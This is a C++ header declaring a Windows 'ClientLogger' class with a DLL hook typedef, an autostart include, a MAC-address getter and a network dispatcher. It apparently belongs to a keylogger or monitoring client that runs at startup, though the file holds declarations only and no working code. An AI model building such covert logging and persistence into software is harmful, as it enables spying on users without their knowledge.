#ifndef _CLIENTLOGGER_HPP_
# define _CLIENTLOGGER_HPP_

# include <string>
# include <thread>
# include <Lmcons.h>
# include <iomanip>

# include <winsock2.h>
# include <iphlpapi.h>

# include "Dispatcher.hpp"
# include <Windows.h>

# include "AutoStart.hpp"

# pragma comment(lib, "IPHLPAPI.lib")

typedef void(__stdcall *pFunc)(void);
typedef bool(__stdcall *hook)(std::shared_ptr<Dispatcher>);

class ClientLogger
{
public:
	ClientLogger();
	~ClientLogger();

	bool	init(const char *name);
	void	run();
	std::string getAddressMAC() const;

private:
	bool	unset();

	bool						_quit;
	HMODULE						_hDll;
	std::string					_filePath;
	std::shared_ptr<Dispatcher>	_disp;
};

#endif